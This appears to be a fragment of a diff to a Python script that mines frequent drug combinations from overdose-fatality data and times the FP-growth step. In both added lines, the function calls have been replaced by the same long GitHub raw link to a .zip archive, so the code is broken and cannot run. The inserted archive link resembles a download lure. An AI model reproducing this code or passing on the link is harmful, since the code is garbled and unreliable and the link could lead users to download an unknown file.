+patterns = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(transactions, int(0.10 * len(transactions)))
+execution_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip() - start_time_fpgrowth
 
 # **Display Execution Time Results**
 print("\nExecution Time:")
